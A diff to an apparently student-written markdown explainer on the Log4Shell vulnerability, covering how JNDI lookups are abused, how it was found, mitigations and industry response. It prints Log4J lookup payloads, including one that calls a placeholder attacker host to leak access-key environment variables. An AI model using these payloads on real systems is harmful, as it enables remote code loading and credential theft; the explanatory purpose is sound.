@@ -35,9 +35,10 @@ In 2013, a cotributer made a change to Log4J that allowed the developer to do th
 ```java
 logger.info("{} has logged in using id {}", "${jndi:ldap://logconfig/example/name}", user.getId());
 ```
-This is the vulnerability. Let's say a vulnerable application logs a users input. A user could then input a string like ```${jndi:ldap://myserver/malicious_code}```. Log4J will see this and try to look up this JNDI. Which would then introduce a malicious java object into the JVM.  
+The code above is the vulnerability. Let's say a vulnerable application logs a users input. A user could then input a string like ```${jndi:ldap://myserver/malicious_code}```. Log4J will see this and try to look up this JNDI. Which would then introduce a malicious java object into the JVM.  
 
 ## How did Log4Shell get discovered?
+According to [this source](https://www.npr.org/2021/12/14/1064123144/companies-scramble-to-defend-against-newly-discovered-log4j-digital-flaw?t=1640603508585) A researcher working for Chinese tech firm Alibaba discovered the bug and privately informed the Apache Software Foundation. It accidentally went public after the popular word building video game Minecraft made its disclosure and the researcher posted about it online. 
 
 
 ## What are the potential fixes for severe vulnerabilities like Log4Shell?
@@ -48,8 +49,10 @@ com.sun.jdni.rmi.object.trustURLCodebase
 ```
 This however won't stop your application from actually making the call. It only stops the contents of that call from doing anything. This still enables hackers to make your application leak it's environment variables, like in the code below:
 ```java
-${jndi:ldap://malicious_atacker:123/${env:ACCES_KEY_ID}/${env:SECRET_ACCES_KEY}}
+${jndi:ldap://attackerip/exploit/${env:ACCES_KEY_ID}/${env:SECRET_ACCES_KEY}}
 ```
+A more definitive way of fixing the vulnerability is to  update log4j to version 2.16 or above. This can be rather difficult, since an application can have dependencies on things, which then have dependencies on Log4j. You would either have to wait for that dependency to publish an update, or if you're using gradle, you could use a function called dependency constraints.
+Another way that some companies used to fix it is to directly patch it. Which may be the eassiest option in some cases.
 
 
 
@@ -58,6 +61,11 @@ ${jndi:ldap://malicious_atacker:123/${env:ACCES_KEY_ID}/${env:SECRET_ACCES_KEY}}
 ![image](https://user-images.githubusercontent.com/77112006/147350117-701b817a-cda4-412c-b85e-89865f4fa72d.png)
 
 ## How did affected developers deal with it?
+After the news of this exploit was made public, virtually every tech companies number one priotity was to find a way to fix it within their software, before any hacker could exploit it. The Washington post stated 
+> At Google alone, more than 500 engineers had been going through reams and reams of code to make sure it was safe, according to one employee.
+
+
+
 
 Sources:
 - [Log4J Vulnerability (Log4Shell) Explained - for Java developers. (2021, 16 december). [Video]. YouTube.](https://www.youtube.com/watch?v=uyq8yxWO1ls&t=1037s&ab_channel=JavaBrains)
@@ -66,3 +74,4 @@ Sources:
 -  [Yan, Tao; Deng, Qi; Zhang, Haozhe; Fu, Yu; Grunzweig, Josh (10 December 2021). "Another Apache Log4j Vulnerability Is Actively Exploited in the Wild (CVE-2021-44228)".](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)
 -  [NVD - Vulnerability Metrics. (z.d.). NVD. Geraadpleegd op 24 december 2021](https://nvd.nist.gov/vuln-metrics/cvss)
 -  [What is JNDI? What is its basic use? When is it used? (2010, 6 december). Stack Overflow. Geraadpleegd op 27 december 2021](https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used)
+-  [Hunter, T., & De Vynck, G. (2021, 20 december). The ‘most serious’ security breach ever is unfolding right now. Here’s what you need to know. Washington Post. Geraadpleegd op 27 december 2021](https://www.washingtonpost.com/technology/2021/12/20/log4j-hack-vulnerability-java/#LSWMB3XKYRALRAPBVQHPTFUQSI)
